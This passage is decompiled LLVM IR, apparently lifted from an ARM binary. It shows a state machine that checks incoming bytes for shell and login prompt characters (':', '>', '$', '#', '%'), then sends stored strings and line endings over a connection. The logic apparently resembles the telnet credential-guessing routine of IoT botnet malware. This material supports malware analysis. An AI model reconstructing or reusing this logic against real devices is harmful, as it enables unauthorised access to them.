  store i1 %v2_fb4c, i1* %cpsr_c.global-to-local, align 1
  %v7_fb4c = icmp eq i8 %v3_fb48, 62
  store i1 %v7_fb4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb4c, label %dec_label_pc_fb58, label %bb448

bb448:                                            ; preds = %dec_label_pc_fb48
  %v3_fb50 = icmp ugt i8 %v3_fb48, 57
  store i1 %v3_fb50, i1* %cpsr_c.global-to-local, align 1
  %v8_fb50 = icmp eq i8 %v3_fb48, 58
  store i1 %v8_fb50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fb50, label %dec_label_pc_fb58, label %dec_label_pc_fb24

dec_label_pc_fb58:                                ; preds = %dec_label_pc_fb48, %bb448, %dec_label_pc_fb34, %dec_label_pc_fb2c, %dec_label_pc_fb24, %dec_label_pc_fb10, %dec_label_pc_faec, %dec_label_pc_fb08, %dec_label_pc_fb00, %bb447
  %v0_fb5c = phi i32 [ %v1_fae0, %dec_label_pc_fb10 ], [ %v1_fae0, %dec_label_pc_faec ], [ %v1_fae0, %dec_label_pc_fb08 ], [ %v1_fae0, %dec_label_pc_fb00 ], [ %v1_fae0, %bb447 ], [ %v1_fb40, %dec_label_pc_fb24 ], [ %v1_fb40, %dec_label_pc_fb2c ], [ %v1_fb40, %dec_label_pc_fb34 ], [ %v1_fb40, %bb448 ], [ %v1_fb40, %dec_label_pc_fb48 ]
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_fb5c = add i32 %v0_fb5c, 1
  store i32 %v1_fb5c, i32* @r8, align 4
  %v1_fb60 = call i32 @function_1030c(i32 7)
  store i32 %v2_fe00, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r0.global-to-local, align 4
  %v3_fb70 = call i32 @function_10248(i32 7, i32* nonnull %stack_var_-60)
  store i32 %v3_fb70, i32* %r0.global-to-local, align 4
  %v3_fb74 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fb74, i32* %r2.global-to-local, align 4
  store i32 %v3_fb70, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fb80 = load i32, i32* @r6, align 4
  %v1_fb80 = add i32 %v0_fb80, 4
  %v2_fb80 = inttoptr i32 %v1_fb80 to i32*
  %v3_fb80 = load i32, i32* %v2_fb80, align 4
  store i32 %v3_fb80, i32* %r0.global-to-local, align 4
  %v4_fb84 = call i32 @function_11a30(i32 %v3_fb80, i32 %v3_fb70, i32 %v3_fb74, i32 16384)
  store i32 %v4_fb84, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1673c.190 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fb94 = load i32, i32* @r6, align 4
  %v1_fb94 = add i32 %v0_fb94, 4
  %v2_fb94 = inttoptr i32 %v1_fb94 to i32*
  %v3_fb94 = load i32, i32* %v2_fb94, align 4
  store i32 %v3_fb94, i32* %r0.global-to-local, align 4
  %v4_fb98 = call i32 @function_11a30(i32 %v3_fb94, i32 ptrtoint ([3 x i8]* @global_var_1673c.190 to i32), i32 2, i32 16384)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_fba0 = call i32 @function_1026c(i32 7)
  store i32 %v1_fba0, i32* %r0.global-to-local, align 4
  store i32 9, i32* @r3, align 4
  %v1_fba8 = load i32, i32* @r6, align 4
  %v2_fba8 = add i32 %v1_fba8, 12
  %v3_fba8 = inttoptr i32 %v2_fba8 to i32*
  store i32 9, i32* %v3_fba8, align 4
  br label %dec_label_pc_f6ec

dec_label_pc_fbb0:                                ; preds = %dec_label_pc_f4fc
  %v1_fbb0 = add i32 %v0_f4fc, 24
  %v2_fbb0 = inttoptr i32 %v1_fbb0 to i32*
  %v3_fbb0 = load i32, i32* %v2_fbb0, align 4
  store i32 %v3_fbb0, i32* %r2.global-to-local, align 4
  %v1_fbb4 = add i32 %v3_fbb0, -1
  store i32 %v1_fbb4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fbb8 = icmp eq i32 %v1_fbb4, 0
  store i1 %v2_fbb8, i1* %cpsr_z.global-to-local, align 1
  %tmp449 = icmp slt i32 %v1_fbb4, 1
  br i1 %tmp449, label %dec_label_pc_fc1c, label %dec_label_pc_fbc0

dec_label_pc_fbc0:                                ; preds = %dec_label_pc_fbb0
  %v2_fbc0 = add i32 %v1_fbb4, %v0_f4fc
  store i32 %v2_fbc0, i32* %r3.global-to-local, align 4
  %v1_fbc4 = add i32 %v2_fbc0, 28
  %v2_fbc4 = inttoptr i32 %v1_fbc4 to i8*
  %v3_fbc4 = load i8, i8* %v2_fbc4, align 1
  %v4_fbc4 = zext i8 %v3_fbc4 to i32
  store i32 %v4_fbc4, i32* %r3.global-to-local, align 4
  %v2_fbc8 = icmp ugt i8 %v3_fbc4, 61
  store i1 %v2_fbc8, i1* %cpsr_c.global-to-local, align 1
  %v7_fbc8 = icmp eq i8 %v3_fbc4, 62
  store i1 %v7_fbc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbc8, label %dec_label_pc_ff50, label %bb450

bb450:                                            ; preds = %dec_label_pc_fbc0
  %v3_fbcc = icmp ugt i8 %v3_fbc4, 57
  store i1 %v3_fbcc, i1* %cpsr_c.global-to-local, align 1
  %v8_fbcc = icmp eq i8 %v3_fbc4, 58
  store i1 %v8_fbcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fbcc, label %dec_label_pc_ff50, label %dec_label_pc_fbd4

dec_label_pc_fbd4:                                ; preds = %bb450
  %v2_fbd4 = icmp ugt i8 %v3_fbc4, 35
  store i1 %v2_fbd4, i1* %cpsr_c.global-to-local, align 1
  %v7_fbd4 = icmp eq i8 %v3_fbc4, 36
  store i1 %v7_fbd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbd4, label %dec_label_pc_ff50, label %dec_label_pc_fbdc

dec_label_pc_fbdc:                                ; preds = %dec_label_pc_fbd4
  %v2_fbdc = icmp ugt i8 %v3_fbc4, 34
  store i1 %v2_fbdc, i1* %cpsr_c.global-to-local, align 1
  %v7_fbdc = icmp eq i8 %v3_fbc4, 35
  store i1 %v7_fbdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbdc, label %dec_label_pc_ff50, label %dec_label_pc_fc14.preheader

dec_label_pc_fc14.preheader:                      ; preds = %dec_label_pc_fbdc
  %v3_fbe0 = add i32 %v0_f4fc, 28
  %v2_fbe4 = add i32 %v3_fbe0, %v3_fbb0
  store i32 %v2_fbe4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fc14

dec_label_pc_fbf0:                                ; preds = %dec_label_pc_fc14
  %v1_fbf0 = add i32 %v0_fc0c, -2
  %v2_fbf0 = inttoptr i32 %v1_fbf0 to i8*
  %v3_fbf0 = load i8, i8* %v2_fbf0, align 1
  %v4_fbf0 = zext i8 %v3_fbf0 to i32
  store i32 %v4_fbf0, i32* %r2.global-to-local, align 4
  %v2_fbf4 = icmp ugt i8 %v3_fbf0, 61
  store i1 %v2_fbf4, i1* %cpsr_c.global-to-local, align 1
  %v7_fbf4 = icmp eq i8 %v3_fbf0, 62
  store i1 %v7_fbf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbf4, label %dec_label_pc_ff50, label %bb451

bb451:                                            ; preds = %dec_label_pc_fbf0
  %v3_fbf8 = icmp ugt i8 %v3_fbf0, 57
  store i1 %v3_fbf8, i1* %cpsr_c.global-to-local, align 1
  %v8_fbf8 = icmp eq i8 %v3_fbf0, 58
  store i1 %v8_fbf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fbf8, label %dec_label_pc_ff50, label %dec_label_pc_fc00

dec_label_pc_fc00:                                ; preds = %bb451
  %v2_fc00 = icmp ugt i8 %v3_fbf0, 35
  store i1 %v2_fc00, i1* %cpsr_c.global-to-local, align 1
  %v7_fc00 = icmp eq i8 %v3_fbf0, 36
  store i1 %v7_fc00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc00, label %dec_label_pc_ff50, label %dec_label_pc_fc08

dec_label_pc_fc08:                                ; preds = %dec_label_pc_fc00
  %v2_fc08 = icmp ugt i8 %v3_fbf0, 34
  store i1 %v2_fc08, i1* %cpsr_c.global-to-local, align 1
  %v7_fc08 = icmp eq i8 %v3_fbf0, 35
  store i1 %v7_fc08, i1* %cpsr_z.global-to-local, align 1
  %v1_fc0c = add i32 %v0_fc0c, -1
  store i32 %v1_fc0c, i32* %r3.global-to-local, align 4
  br i1 %v7_fc08, label %dec_label_pc_ff50, label %dec_label_pc_fc14

dec_label_pc_fc14:                                ; preds = %dec_label_pc_fc14.preheader, %dec_label_pc_fc08
  %v0_fc0c = phi i32 [ %v2_fbe4, %dec_label_pc_fc14.preheader ], [ %v1_fc0c, %dec_label_pc_fc08 ]
  %v0_fc14 = phi i32 [ %v1_fbb4, %dec_label_pc_fc14.preheader ], [ %v1_fc14, %dec_label_pc_fc08 ]
  %v1_fc14 = add i32 %v0_fc14, -1
  store i32 %v1_fc14, i32* %r1.global-to-local, align 4
  %v2_fc14 = icmp ne i32 %v0_fc14, 0
  store i1 %v2_fc14, i1* %cpsr_c.global-to-local, align 1
  %v7_fc14 = icmp eq i32 %v0_fc14, 1
  store i1 %v7_fc14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc14, label %dec_label_pc_fc1c, label %dec_label_pc_fbf0

dec_label_pc_fc1c:                                ; preds = %dec_label_pc_fc14, %dec_label_pc_fbb0
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_fc20 = call i32 @function_1030c(i32 25)
  store i32 %v2_fe00, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_fc30 = call i32 @function_10248(i32 25, i32* nonnull %stack_var_-60)
  %v3_fc34 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fc30, i32* %r2.global-to-local, align 4
  %v1_fc3c = add i32 %v3_fc34, -1
  store i32 %v1_fc3c, i32* %r3.global-to-local, align 4
  %v0_fc40 = load i32, i32* @fp, align 4
  store i32 %v0_fc40, i32* %r0.global-to-local, align 4
  %v0_fc44 = load i32, i32* @r6, align 4
  %v1_fc44 = add i32 %v0_fc44, 24
  %v2_fc44 = inttoptr i32 %v1_fc44 to i32*
  %v3_fc44 = load i32, i32* %v2_fc44, align 4
  store i32 %v3_fc44, i32* %r1.global-to-local, align 4
  %v4_fc48 = call i32 @function_10904(i32 %v0_fc40, i32 %v3_fc44, i32 %v3_fc30, i32 %v1_fc3c)
  store i32 %v4_fc48, i32* %r0.global-to-local, align 4
  %v2_fc4c = icmp eq i32 %v4_fc48, -1
  store i1 %v2_fc4c, i1* %cpsr_c.global-to-local, align 1
  %v7_fc4c = icmp eq i32 %v4_fc48, -1
  store i1 %v7_fc4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc4c, label %dec_label_pc_101fc.loopexit, label %dec_label_pc_fc5c

dec_label_pc_fc5c:                                ; preds = %dec_label_pc_fc1c
  store i32 1, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_fc60 = call i32 @function_1026c(i32 25)
  br label %dec_label_pc_fc64

dec_label_pc_fc64:                                ; preds = %dec_label_pc_ff50, %dec_label_pc_fc5c
  %storemerge = phi i32 [ %v1_fc60, %dec_label_pc_fc5c ], [ %v1_ff58, %dec_label_pc_ff50 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v0_fc64 = load i32, i32* @r6, align 4
  %v1_fc64 = inttoptr i32 %v0_fc64 to i32*
  %v2_fc64 = load i32, i32* %v1_fc64, align 4
  store i32 %v2_fc64, i32* %r3.global-to-local, align 4
  %v1_fc68 = add i32 %v0_fc64, 4
  %v2_fc68 = inttoptr i32 %v1_fc68 to i32*
  %v3_fc68 = load i32, i32* %v2_fc68, align 4
  store i32 %v3_fc68, i32* %r0.global-to-local, align 4
  %v1_fc6c = add i32 %v2_fc64, 13
  %v2_fc6c = inttoptr i32 %v1_fc6c to i8*
  %v3_fc6c = load i8, i8* %v2_fc6c, align 1
  %v4_fc6c = zext i8 %v3_fc6c to i32
  store i32 %v4_fc6c, i32* %r2.global-to-local, align 4
  %v1_fc70 = add i32 %v2_fc64, 4
  %v2_fc70 = inttoptr i32 %v1_fc70 to i32*
  %v3_fc70 = load i32, i32* %v2_fc70, align 4
  store i32 %v3_fc70, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc78 = call i32 @function_11a30(i32 %v3_fc68, i32 %v3_fc70, i32 %v4_fc6c, i32 16384)
  store i32 %v4_fc78, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fc80 = load i32, i32* @r6, align 4
  %v1_fc80 = add i32 %v0_fc80, 4
  %v2_fc80 = inttoptr i32 %v1_fc80 to i32*
  %v3_fc80 = load i32, i32* %v2_fc80, align 4
  store i32 %v3_fc80, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1673c.190 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_fc8c = call i32 @function_11a30(i32 %v3_fc80, i32 ptrtoint ([3 x i8]* @global_var_1673c.190 to i32), i32 2, i32 16384)
  store i32 %v4_fc8c, i32* %r0.global-to-local, align 4
  store i32 5, i32* @r3, align 4
  %v1_fc94 = load i32, i32* @r6, align 4
  %v2_fc94 = add i32 %v1_fc94, 12
  %v3_fc94 = inttoptr i32 %v2_fc94 to i32*
  store i32 5, i32* %v3_fc94, align 4
  br label %dec_label_pc_f6e4

dec_label_pc_fc9c:                                ; preds = %dec_label_pc_f4fc
  %v1_fc9c = add i32 %v0_f4fc, 24
  %v2_fc9c = inttoptr i32 %v1_fc9c to i32*
  %v3_fc9c = load i32, i32* %v2_fc9c, align 4
  store i32 %v3_fc9c, i32* %r2.global-to-local, align 4
  %v1_fca0 = add i32 %v3_fc9c, -1
  store i32 %v1_fca0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fca4 = icmp eq i32 %v1_fca0, 0
  store i1 %v2_fca4, i1* %cpsr_z.global-to-local, align 1
  %tmp452 = icmp slt i32 %v1_fca0, 1
  br i1 %tmp452, label %dec_label_pc_f47c.backedge.thread, label %dec_label_pc_fcac

dec_label_pc_fcac:                                ; preds = %dec_label_pc_fc9c
  %v2_fcac = add i32 %v1_fca0, %v0_f4fc
  store i32 %v2_fcac, i32* %r3.global-to-local, align 4
  %v1_fcb0 = add i32 %v2_fcac, 28
  %v2_fcb0 = inttoptr i32 %v1_fcb0 to i8*
  %v3_fcb0 = load i8, i8* %v2_fcb0, align 1
  %v4_fcb0 = zext i8 %v3_fcb0 to i32
  store i32 %v4_fcb0, i32* %r3.global-to-local, align 4
  %v2_fcb4 = icmp ugt i8 %v3_fcb0, 61
  store i1 %v2_fcb4, i1* %cpsr_c.global-to-local, align 1
  %v7_fcb4 = icmp eq i8 %v3_fcb0, 62
  store i1 %v7_fcb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcb4, label %dec_label_pc_fd18, label %bb453

bb453:                                            ; preds = %dec_label_pc_fcac
  %v3_fcb8 = icmp ugt i8 %v3_fcb0, 57
  store i1 %v3_fcb8, i1* %cpsr_c.global-to-local, align 1
  %v8_fcb8 = icmp eq i8 %v3_fcb0, 58
  store i1 %v8_fcb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fcb8, label %dec_label_pc_fd18, label %dec_label_pc_fcc0

dec_label_pc_fcc0:                                ; preds = %bb453
  %v2_fcc0 = icmp ugt i8 %v3_fcb0, 35
  store i1 %v2_fcc0, i1* %cpsr_c.global-to-local, align 1
  %v7_fcc0 = icmp eq i8 %v3_fcb0, 36
  store i1 %v7_fcc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcc0, label %dec_label_pc_fd18, label %dec_label_pc_fcc8

dec_label_pc_fcc8:                                ; preds = %dec_label_pc_fcc0
  %v2_fcc8 = icmp ugt i8 %v3_fcb0, 34
  store i1 %v2_fcc8, i1* %cpsr_c.global-to-local, align 1
  %v7_fcc8 = icmp eq i8 %v3_fcb0, 35
  store i1 %v7_fcc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcc8, label %dec_label_pc_fd18, label %dec_label_pc_fcd0

dec_label_pc_fcd0:                                ; preds = %dec_label_pc_fcc8
  %v2_fcd0 = icmp ugt i8 %v3_fcb0, 36
  store i1 %v2_fcd0, i1* %cpsr_c.global-to-local, align 1
  %v7_fcd0 = icmp eq i8 %v3_fcb0, 37
  store i1 %v7_fcd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcd0, label %dec_label_pc_fd18, label %dec_label_pc_fd00.preheader

dec_label_pc_fd00.preheader:                      ; preds = %dec_label_pc_fcd0
  %v3_fcd4 = add i32 %v0_f4fc, 28
  %v2_fcd8 = add i32 %v3_fcd4, %v3_fc9c
  store i32 %v2_fcd8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fd00

dec_label_pc_fce4:                                ; preds = %bb454
  %v2_fce4 = icmp ugt i8 %v3_fd08, 35
  store i1 %v2_fce4, i1* %cpsr_c.global-to-local, align 1
  %v7_fce4 = icmp eq i8 %v3_fd08, 36
  store i1 %v7_fce4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fce4, label %dec_label_pc_fd18, label %dec_label_pc_fcec

dec_label_pc_fcec:                                ; preds = %dec_label_pc_fce4
  %v2_fcec = icmp ugt i8 %v3_fd08, 34
  store i1 %v2_fcec, i1* %cpsr_c.global-to-local, align 1
  %v7_fcec = icmp eq i8 %v3_fd08, 35
  store i1 %v7_fcec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcec, label %dec_label_pc_fd18, label %dec_label_pc_fcf4

dec_label_pc_fcf4:                                ; preds = %dec_label_pc_fcec
  %v2_fcf4 = icmp ugt i8 %v3_fd08, 36
  store i1 %v2_fcf4, i1* %cpsr_c.global-to-local, align 1
  %v7_fcf4 = icmp eq i8 %v3_fd08, 37
  store i1 %v7_fcf4, i1* %cpsr_z.global-to-local, align 1
  %v1_fcf8 = add i32 %v0_fcf8, -1
  store i32 %v1_fcf8, i32* %r3.global-to-local, align 4
  br i1 %v7_fcf4, label %dec_label_pc_fd18, label %dec_label_pc_fd00

dec_label_pc_fd00:                                ; preds = %dec_label_pc_fd00.preheader, %dec_label_pc_fcf4
  %v0_fcf8 = phi i32 [ %v2_fcd8, %dec_label_pc_fd00.preheader ], [ %v1_fcf8, %dec_label_pc_fcf4 ]
  %v0_fd00 = phi i32 [ %v1_fca0, %dec_label_pc_fd00.preheader ], [ %v1_fd00, %dec_label_pc_fcf4 ]
  %v1_fd00 = add i32 %v0_fd00, -1
  store i32 %v1_fd00, i32* %r1.global-to-local, align 4
  %v2_fd00 = icmp ne i32 %v0_fd00, 0
  store i1 %v2_fd00, i1* %cpsr_c.global-to-local, align 1
  %v7_fd00 = icmp eq i32 %v0_fd00, 1
  store i1 %v7_fd00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd00, label %dec_label_pc_f47c.backedge.thread565, label %dec_label_pc_fd08

dec_label_pc_fd08:                                ; preds = %dec_label_pc_fd00
  %v1_fd08 = add i32 %v0_fcf8, -2
  %v2_fd08 = inttoptr i32 %v1_fd08 to i8*
  %v3_fd08 = load i8, i8* %v2_fd08, align 1
  %v4_fd08 = zext i8 %v3_fd08 to i32
  store i32 %v4_fd08, i32* %r2.global-to-local, align 4
  %v2_fd0c = icmp ugt i8 %v3_fd08, 61
  store i1 %v2_fd0c, i1* %cpsr_c.global-to-local, align 1
  %v7_fd0c = icmp eq i8 %v3_fd08, 62
  store i1 %v7_fd0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd0c, label %dec_label_pc_fd18, label %bb454

bb454:                                            ; preds = %dec_label_pc_fd08
  %v3_fd10 = icmp ugt i8 %v3_fd08, 57
  store i1 %v3_fd10, i1* %cpsr_c.global-to-local, align 1
  %v8_fd10 = icmp eq i8 %v3_fd08, 58
  store i1 %v8_fd10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fd10, label %dec_label_pc_fd18, label %dec_label_pc_fce4

dec_label_pc_fd18:                                ; preds = %dec_label_pc_fd08, %bb454, %dec_label_pc_fcf4, %dec_label_pc_fcec, %dec_label_pc_fce4, %dec_label_pc_fcd0, %dec_label_pc_fcac, %dec_label_pc_fcc8, %dec_label_pc_fcc0, %bb453
  %v0_fd1c = phi i32 [ %v1_fca0, %dec_label_pc_fcd0 ], [ %v1_fca0, %dec_label_pc_fcac ], [ %v1_fca0, %dec_label_pc_fcc8 ], [ %v1_fca0, %dec_label_pc_fcc0 ], [ %v1_fca0, %bb453 ], [ %v1_fd00, %dec_label_pc_fce4 ], [ %v1_fd00, %dec_label_pc_fcec ], [ %v1_fd00, %dec_label_pc_fcf4 ], [ %v1_fd00, %bb454 ], [ %v1_fd00, %dec_label_pc_fd08 ]
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_fd1c = add i32 %v0_fd1c, 1
  store i32 %v1_fd1c, i32* @r8, align 4
  %v1_fd20 = call i32 @function_1030c(i32 4)
  store i32 %v2_fe00, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v3_fd30 = call i32 @function_10248(i32 4, i32* nonnull %stack_var_-60)
  store i32 %v3_fd30, i32* %r0.global-to-local, align 4
  %v3_fd34 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fd34, i32* %r2.global-to-local, align 4
  store i32 %v3_fd30, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fd40 = load i32, i32* @r6, align 4
  %v1_fd40 = add i32 %v0_fd40, 4
  %v2_fd40 = inttoptr i32 %v1_fd40 to i32*
  %v3_fd40 = load i32, i32* %v2_fd40, align 4
  store i32 %v3_fd40, i32* %r0.global-to-local, align 4
  %v4_fd44 = call i32 @function_11a30(i32 %v3_fd40, i32 %v3_fd30, i32 %v3_fd34, i32 16384)
  store i32 %v4_fd44, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1673c.190 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fd54 = load i32, i32* @r6, align 4
  %v1_fd54 = add i32 %v0_fd54, 4
  %v2_fd54 = inttoptr i32 %v1_fd54 to i32*
  %v3_fd54 = load i32, i32* %v2_fd54, align 4
  store i32 %v3_fd54, i32* %r0.global-to-local, align 4
  %v4_fd58 = call i32 @function_11a30(i32 %v3_fd54, i32 ptrtoint ([3 x i8]* @global_var_1673c.190 to i32), i32 2, i32 16384)
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_fd60 = call i32 @function_1026c(i32 4)
  store i32 %v1_fd60, i32* %r0.global-to-local, align 4
  store i32 8, i32* @r3, align 4
  %v1_fd68 = load i32, i32* @r6, align 4
  %v2_fd68 = add i32 %v1_fd68, 12
  %v3_fd68 = inttoptr i32 %v2_fd68 to i32*
  store i32 8, i32* %v3_fd68, align 4
  br label %dec_label_pc_f6ec

dec_label_pc_fd70:                                ; preds = %dec_label_pc_f4fc
  %v1_fd70 = add i32 %v0_f4fc, 24
  %v2_fd70 = inttoptr i32 %v1_fd70 to i32*
  %v3_fd70 = load i32, i32* %v2_fd70, align 4
  store i32 %v3_fd70, i32* %r2.global-to-local, align 4
  %v1_fd74 = add i32 %v3_fd70, -1
  store i32 %v1_fd74, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fd78 = icmp eq i32 %v1_fd74, 0
  store i1 %v2_fd78, i1* %cpsr_z.global-to-local, align 1
  %tmp455 = icmp slt i32 %v1_fd74, 1
  br i1 %tmp455, label %dec_label_pc_fdec, label %dec_label_pc_fd80

dec_label_pc_fd80:                                ; preds = %dec_label_pc_fd70
  %v2_fd80 = add i32 %v1_fd74, %v0_f4fc
  store i32 %v2_fd80, i32* %r3.global-to-local, align 4
  %v1_fd84 = add i32 %v2_fd80, 28
  %v2_fd84 = inttoptr i32 %v1_fd84 to i8*
  %v3_fd84 = load i8, i8* %v2_fd84, align 1
  %v4_fd84 = zext i8 %v3_fd84 to i32
  store i32 %v4_fd84, i32* %r3.global-to-local, align 4
  %v2_fd88 = icmp ugt i8 %v3_fd84, 61
  store i1 %v2_fd88, i1* %cpsr_c.global-to-local, align 1
  %v7_fd88 = icmp eq i8 %v3_fd84, 62
  store i1 %v7_fd88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd88, label %dec_label_pc_ff04, label %bb456

bb456:                                            ; preds = %dec_label_pc_fd80
  %v3_fd8c = icmp ugt i8 %v3_fd84, 57
  store i1 %v3_fd8c, i1* %cpsr_c.global-to-local, align 1
  %v8_fd8c = icmp eq i8 %v3_fd84, 58
  store i1 %v8_fd8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fd8c, label %dec_label_pc_ff04, label %dec_label_pc_fd94

dec_label_pc_fd94:                                ; preds = %bb456
  %v2_fd94 = icmp ugt i8 %v3_fd84, 35
  store i1 %v2_fd94, i1* %cpsr_c.global-to-local, align 1
  %v7_fd94 = icmp eq i8 %v3_fd84, 36
  store i1 %v7_fd94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd94, label %dec_label_pc_ff04, label %dec_label_pc_fd9c

dec_label_pc_fd9c:                                ; preds = %dec_label_pc_fd94
  %v2_fd9c = icmp ugt i8 %v3_fd84, 34
  store i1 %v2_fd9c, i1* %cpsr_c.global-to-local, align 1
  %v7_fd9c = icmp eq i8 %v3_fd84, 35
  store i1 %v7_fd9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd9c, label %dec_label_pc_ff04, label %dec_label_pc_fda4

dec_label_pc_fda4:                                ; preds = %dec_label_pc_fd9c
  %v2_fda4 = icmp ugt i8 %v3_fd84, 36
  store i1 %v2_fda4, i1* %cpsr_c.global-to-local, align 1
  %v7_fda4 = icmp eq i8 %v3_fd84, 37
  store i1 %v7_fda4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fda4, label %dec_label_pc_ff04, label %dec_label_pc_fde4.preheader

dec_label_pc_fde4.preheader:                      ; preds = %dec_label_pc_fda4
  %v3_fda8 = add i32 %v0_f4fc, 28
  %v2_fdac = add i32 %v3_fda8, %v3_fd70
  store i32 %v2_fdac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fde4

dec_label_pc_fdb8:                                ; preds = %dec_label_pc_fde4
  %v1_fdb8 = add i32 %v0_fddc, -2
  %v2_fdb8 = inttoptr i32 %v1_fdb8 to i8*
  %v3_fdb8 = load i8, i8* %v2_fdb8, align 1
  %v4_fdb8 = zext i8 %v3_fdb8 to i32
  store i32 %v4_fdb8, i32* %r2.global-to-local, align 4
  %v2_fdbc = icmp ugt i8 %v3_fdb8, 61
  store i1 %v2_fdbc, i1* %cpsr_c.global-to-local, align 1
  %v7_fdbc = icmp eq i8 %v3_fdb8, 62
  store i1 %v7_fdbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fdbc, label %dec_label_pc_ff04, label %bb457

bb457:                                            ; preds = %dec_label_pc_fdb8
  %v3_fdc0 = icmp ugt i8 %v3_fdb8, 57
  store i1 %v3_fdc0, i1* %cpsr_c.global-to-local, align 1
  %v8_fdc0 = icmp eq i8 %v3_fdb8, 58
  store i1 %v8_fdc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fdc0, label %dec_label_pc_ff04, label %dec_label_pc_fdc8

dec_label_pc_fdc8:                                ; preds = %bb457
  %v2_fdc8 = icmp ugt i8 %v3_fdb8, 35
  store i1 %v2_fdc8, i1* %cpsr_c.global-to-local, align 1
  %v7_fdc8 = icmp eq i8 %v3_fdb8, 36
  store i1 %v7_fdc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fdc8, label %dec_label_pc_ff04, label %dec_label_pc_fdd0

dec_label_pc_fdd0:                                ; preds = %dec_label_pc_fdc8
  %v2_fdd0 = icmp ugt i8 %v3_fdb8, 34
  store i1 %v2_fdd0, i1* %cpsr_c.global-to-local, align 1
  %v7_fdd0 = icmp eq i8 %v3_fdb8, 35
  store i1 %v7_fdd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fdd0, label %dec_label_pc_ff04, label %dec_label_pc_fdd8

dec_label_pc_fdd8:                                ; preds = %dec_label_pc_fdd0
  %v2_fdd8 = icmp ugt i8 %v3_fdb8, 36
  store i1 %v2_fdd8, i1* %cpsr_c.global-to-local, align 1
  %v7_fdd8 = icmp eq i8 %v3_fdb8, 37
  store i1 %v7_fdd8, i1* %cpsr_z.global-to-local, align 1
  %v1_fddc = add i32 %v0_fddc, -1
  store i32 %v1_fddc, i32* %r3.global-to-local, align 4
  br i1 %v7_fdd8, label %dec_label_pc_ff04, label %dec_label_pc_fde4

dec_label_pc_fde4:                                ; preds = %dec_label_pc_fde4.preheader, %dec_label_pc_fdd8
  %v0_fddc = phi i32 [ %v2_fdac, %dec_label_pc_fde4.preheader ], [ %v1_fddc, %dec_label_pc_fdd8 ]
  %v0_fde4 = phi i32 [ %v1_fd74, %dec_label_pc_fde4.preheader ], [ %v1_fde4, %dec_label_pc_fdd8 ]
  %v1_fde4 = add i32 %v0_fde4, -1
  store i32 %v1_fde4, i32* %r1.global-to-local, align 4
